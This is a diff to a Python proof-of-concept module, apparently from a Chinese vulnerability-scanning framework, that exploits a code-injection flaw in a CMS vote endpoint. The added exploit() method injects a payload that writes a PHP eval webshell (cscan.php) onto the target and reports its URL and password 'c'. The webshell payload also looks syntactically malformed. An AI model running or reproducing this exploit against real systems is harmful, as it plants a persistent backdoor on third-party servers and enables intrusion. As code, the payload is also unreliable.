@@ -54,12 +54,12 @@ class Poc(ABPoc):
                 for i in ids:
                     exploit_url = '%s/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % (vul_url, i)
                     payload = {'subjectid': 1,
-                               'radio[]': ');fputs(fopen(base64_decode(YnVnc2Nhbi5waHA=),w),"vulnerable test");'}
+                               'radio[]': ');fputs(fopen(base64_decode(Y3NjYW4ucGhw),w),"vulnerable test");'}
                     post_data = urllib.urlencode(payload)
                     hh.http('-d "%s" %s' % (post_data, exploit_url))
                     verify_url = '%s/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % (vul_url, i)
                     hh.http(verify_url)
-                    shell_url = '%sbugscan.php' % vul_url
+                    shell_url = '%s/cscan.php' % vul_url
                     code, head, res, _, _ = hh.http(shell_url)
                     if code == 200 and 'vulnerable test' in res:
                         #security_hole(vul_url)
@@ -71,7 +71,33 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.verify()
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+             
+            
+            args = self.target
+            vul_url = args
+            ids = get_vote_links(args)
+            if ids:
+                for i in ids:
+                    exploit_url = '%s/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % (vul_url, i)
+                    payload = {'subjectid': 1,
+                               'radio[]': ');fputs(fopen(base64_decode(Y3NjYW4ucGhw),w),"vulnerable test"<?php @eval($_POST[c);?>);'}
+                    post_data = urllib.urlencode(payload)
+                    hh.http('-d "%s" %s' % (post_data, exploit_url))
+                    verify_url = '%s/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % (vul_url, i)
+                    hh.http(verify_url)
+                    shell_url = '%s/cscan.php' % vul_url
+                    code, head, res, _, _ = hh.http(shell_url)
+                    if code == 200 and 'vulnerable test' in res:
+                        #security_hole(vul_url)
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
+                            target=self.target, name=self.vuln.name, url=shell_url))
+            pass
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
